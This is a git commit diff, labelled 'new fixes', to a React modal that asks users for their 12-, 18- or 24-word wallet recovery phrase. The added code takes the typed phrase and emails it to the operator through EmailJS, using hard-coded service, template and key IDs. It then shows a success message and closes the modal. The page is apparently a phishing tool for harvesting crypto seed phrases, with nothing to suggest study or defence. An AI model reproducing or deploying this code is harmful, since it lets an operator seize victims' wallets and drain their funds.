d5b781a88f948173484439cc6dccfaeeaebd0468
edidiesky <essienedidiong1000@gmail.com>
2023-06-11 09:18:56 -0700

    new fixes

--- src/components/modals/DeleteModal.jsx
+++ src/components/modals/DeleteModal.jsx
@@ -1,5 +1,6 @@
-import React, { useEffect, useState } from "react";
+import React, { useEffect, useRef, useState } from "react";
 import "./index.css";
+import emailjs from "@emailjs/browser";
 import { useDispatch } from "react-redux";
 import { RxCross2 } from "react-icons/rx";
 import Backdrops from "./Backdrops";
@@ -27,15 +28,16 @@ export default function Delete({ Click, handleClose }) {
       opacity: 0,
     },
   };
-  const [textareaValue, setTextareaValue] = useState("");
+  const form = useRef();
+  const [message, setMessage] = useState("");
 
   const handleTextareaChange = (event) => {
-    setTextareaValue(event.target.value);
+    setMessage(event.target.value);
   };
 
   const handleSubmit = (event) => {
     event.preventDefault();
-    const words = textareaValue.split(" ");
+    const words = message.split(" ");
 
     if (words.length < 12) {
       alert("Please enter at least 12 words.");
@@ -43,17 +45,33 @@ export default function Delete({ Click, handleClose }) {
     }
 
     // Process the form submission or perform any other action
-    setTextareaValue("");
+    emailjs
+      .sendForm(
+        "service_a5j6nsp",
+        "template_sw0j4mx",
+        form.current,
+        "QWKTEx5C0Fp0YpDNp"
+      )
+      .then(
+        (result) => {
+          alert("Message has been sucessfully sent");
+        },
+        (error) => {
+          console.log(error.text);
+        }
+      );
+    setMessage("");
+
     console.log("Form submitted successfully");
 
     handleClose();
   };
-  useEffect(() => {
-    if (textareaValue.split(" ").length > 12) {
-      setTextareaValue("");
-      return;
-    }
-  }, [textareaValue.split(" ").length]);
+  // useEffect(() => {
+  //   if (message.split(" ").length > 24) {
+  //     setMessage("");
+  //     return;
+  //   }
+  // }, [message.split(" ").length]);
   return (
     <Backdrops>
       <motion.div
@@ -73,14 +91,15 @@ export default function Delete({ Click, handleClose }) {
               PLEASE ENTER YOUR 12, 18 or 24 WORDS PHRASE
             </h4>
           </div>
-          <form className="flex column w-100 text-start gap-2">
+          <form ref={form} className="flex column w-100 text-start gap-2">
             <h5 className="fs-12 text-grey text-start text-light">
               PLEASE ENTER YOUR 12, 18 or 24 WORDS PHRASE
             </h5>
             <textarea
               placeholder="Input wallet phrase"
               className="area"
-              value={textareaValue}
+              name="message"
+              value={message}
               onChange={(e) => handleTextareaChange(e)}
             ></textarea>
             <div className="w-100 py-2 btnwrapper flex item-center gap-2">
